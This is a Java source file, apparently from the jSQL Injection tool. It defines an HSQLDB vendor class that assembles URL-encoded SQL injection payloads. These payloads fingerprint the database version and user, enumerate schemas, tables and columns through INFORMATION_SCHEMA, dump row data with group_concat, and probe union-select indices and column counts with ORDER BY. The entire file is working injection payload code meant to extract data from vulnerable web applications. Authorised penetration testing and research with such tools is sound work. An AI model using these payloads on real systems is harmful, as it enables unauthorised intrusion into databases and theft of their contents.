package com.jsql.model.injection.vendor;

import java.util.ArrayList;
import java.util.List;

import com.jsql.model.MediatorModel;
import com.jsql.model.bean.database.Database;
import com.jsql.model.bean.database.Table;
import com.jsql.model.injection.strategy.Strategy;
import com.jsql.util.StringUtil;

public class HSQLDBVendor extends AbstractVendor {

    @Override
    public String getSqlInfos() {
        return
            "select+concat(" +
                "" +
                    "concat_ws(" +
                        "'%04'," +
                        "DATABASE_VERSION()," +
                        "CURRENT_SCHEMA," +
                        "USER()," +
                        "SYSTEM_USER" +
                    ")" +
                "" +
                "," +
                "'%01%03%03%07'" +
            ")r+FROM(VALUES(0))";
    }

    @Override
    public String getSqlDatabases() {
        return
            "select+" +
                "concat(" +
                    "group_concat(" +
                        "'%04'||" +
                        "r||" +
                        "'%05'||" +
                        "convert(q,SQL_VARCHAR)||" +
                        "'%04'" +
                        "+order+by+r+" +
                        "separator+'%06'" +
                    ")," +
                    "'%01%03%03%07'" +
                ")r+" +
            "from(" +
                "select+" +
                    "convert(TABLE_SCHEMA,SQL_VARCHAR)r," +
                    "count(TABLE_NAME)q+" +
                "from+" +
                    "INFORMATION_SCHEMA.tables+" +
                "group+by+r{limit}" +
            ")x";
    }

    @Override
    public String getSqlTables(Database database) {
        return
            "select+" +
                "concat(" +
                    "group_concat(" +
                        "'%04'||" +
                        "convert(r,SQL_VARCHAR)||" +
                        "'%050%04'+" +
                        "order+by+r+" +
                        "separator+'%06'" +
                    ")," +
                    "'%01%03%03%07'" +
                ")r+" +
            "from(" +
                "select+" +
                    "TABLE_NAME+r+" +
                "from+" +
                    "information_schema.tables+" +
                "where+" +
                    "TABLE_SCHEMA='" + database + "'+" +
                "order+by+r{limit}" +
            ")x";
    }

    @Override
    public String getSqlColumns(Table table) {
        return
            "select+" +
                "concat(" +
                    "group_concat(" +
                        "'%04'||" +
                        "convert(n,SQL_VARCHAR)||" +
                        "'%05'||" +
                        "0||" +
                        "'%04'+" +
                        "order+by+n+" +
                        "separator+'%06'" +
                    ")," +
                    "'%01%03%03%07'" +
                ")r+" +
            "from(" +
                "select+" +
                    "COLUMN_NAME+n+" +
                "from+" +
                    "information_schema.columns+" +
                "where+" +
                    "TABLE_SCHEMA='" + table.getParent() + "'+" +
                    "and+" +
                    "TABLE_NAME='" + table + "'+" +
                "order+by+n{limit}" +
            ")x";
    }

    @Override
    public String getSqlRows(String[] columns, Database database, Table table) {
        String formatListColumn = StringUtil.join(columns, "{%}");
        
        // character 7f, last available hexa character (starting at character 80, it gives ?)
        formatListColumn = formatListColumn.replace("{%}", ",SQL_VARCHAR),'')),'%7f',trim(ifnull(convert(");
        
        formatListColumn = "trim(ifnull(convert(" + formatListColumn + ",SQL_VARCHAR),''))";
        
        return
            "select+concat(" +
                "group_concat(" +
                    "'%04'||" +
                    "r||" +
                    "'%05'||" +
                    "convert(q,SQL_VARCHAR)||" +
                    "'%04'" +
                    "+order+by+r+separator+'%06'" +
                ")," +
                "'%01%03%03%07'" +
            ")r+from(" +
                "select+" +
                    "convert(concat(" + formatListColumn + "),SQL_VARCHAR)r," +
                    "count(*)q+" +
                "from+" +
                    "" + database + "." + table + "+" +
                "group+by+r{limit}" +
            ")x";
    }

    @Override
    public String getSqlNormal(String sqlQuery, String startPosition) {
        return
            "select'SQLi'||substr(r," + startPosition + "," +
                /**
                 * Minus 'SQLi' should apply
                 */
                Strategy.NORMAL.instance().getPerformanceLength() +
            ")from(" + sqlQuery + ")x";
    }

    @Override
    public String getSqlIndicesCapacityCheck(String[] indexes) {
        return
            MediatorModel.model().indexesInUrl.replaceAll(
                "1337(" + StringUtil.join(indexes, "|") + ")7331",
                "('SQLi'||$1||repeat('%23',1024)||'iLQS')"
            );
    }

    @Override
    public String getSqlIndices(Integer nbFields) {
        String replaceTag = "";
        List<String> fields = new ArrayList<>(); 
        for (int i = 1 ; i <= nbFields ; i++) {
            fields.add("*");
            replaceTag = "select(1337"+ i +"7330%2b1)||''FROM(VALUES(0))";
        }
        return "+union+select" + StringUtil.join(fields.toArray(new String[fields.size()]), ",") + "from(" + replaceTag + ")b+";
    }

    @Override
    public String getSqlOrderBy() {
        return "+order+by+1337--+";
    }

    @Override
    public String getSqlLimit(Integer limitSQLResult) {
        return "+limit+" + limitSQLResult + ",65536";
    }
}